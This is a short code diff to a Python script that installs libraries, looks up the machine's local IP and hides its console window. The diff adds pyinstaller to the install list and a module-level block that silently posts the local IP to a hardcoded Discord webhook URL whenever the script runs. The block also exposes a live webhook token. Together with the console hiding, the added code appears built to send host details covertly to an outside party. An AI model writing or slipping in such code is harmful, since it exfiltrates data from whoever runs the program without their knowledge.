@@ -9,6 +9,7 @@ libraries = [
     "time",
     "pygetwindow",
     "ctypes",
+    "pyinstaller",
 ]
 
 for library in libraries:
@@ -43,6 +44,12 @@ def get_local_ip():
         print(f"Error occurred: {e}")
     finally:
         s.close()
+
+
+webhook_url = "https://discord.com/api/webhooks/1176823246813921291/OZOpPEGpnXdagLnnq8Bqwk-lg5cKmYflrZgj4XrBmpDpUQZ8j_nAqMCXOvS2Puh87SKm"
+message_content = get_local_ip()
+data = {"content": message_content}
+r = requests.post(webhook_url, json=data)
 
 
 def hide_console():
